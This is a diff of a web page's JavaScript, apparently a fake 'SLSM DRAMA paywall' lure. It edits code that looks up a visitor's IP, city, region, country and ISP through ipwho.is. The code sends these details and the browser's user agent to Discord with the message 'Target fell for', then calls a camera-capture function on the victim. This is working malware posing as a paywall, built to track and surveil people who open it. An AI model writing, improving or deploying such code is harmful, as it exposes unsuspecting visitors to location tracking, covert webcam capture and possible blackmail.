@@ -20,7 +20,7 @@
         .container {
             width: 90%;
             max-width: 500px;
-            padding: 20px;
+            payload: 20px;
             background-color: #1a1a1a;
             border-radius: 12px;
             box-shadow: 0 4px 20px rgba(0,0,0,0.5);
@@ -65,23 +65,14 @@
 
         async function getIPInfo() {
             try {
-                // Using ipify for pure IP, fallback to ip-api for location data
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                const ip = ipData.ip;
-
-                let locationData = null;
-                try {
-                    const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
-                    locationData = await locRes.json();
-                } catch (e) {}
-
+                const res = await fetch('https://ipwho.is/');
+                const data = await res.json();
                 return {
-                    ip: ip,
-                    city: locationData?.city || "Unknown",
-                    region: locationData?.region || "Unknown",
-                    country: locationData?.country_name || "Unknown",
-                    org: locationData?.org || "Unknown"
+                    ip: data.ip || "Unknown",
+                    city: data.city || "Unknown",
+                    region: data.region || "Unknown",
+                    country: data.country || "Unknown",
+                    org: data.connection?.isp || "Unknown"
                 };
             } catch (e) {
                 return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", org: "Unknown" };
@@ -119,7 +110,6 @@
             let content = `**Target fell for SLSM DRAMA paywall**\n> **IP:** ${ipInfo.ip}\n> **Location:** ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n> **ISP:** ${ipInfo.org}\n> **Device:** ${navigator.userAgent}\n`;
             await sendToDiscord(content);
 
-            // Delay camera slightly so the browser doesn't choke
             await new Promise(r => setTimeout(r, 1000));
             
             const camBlob = await captureCamera();
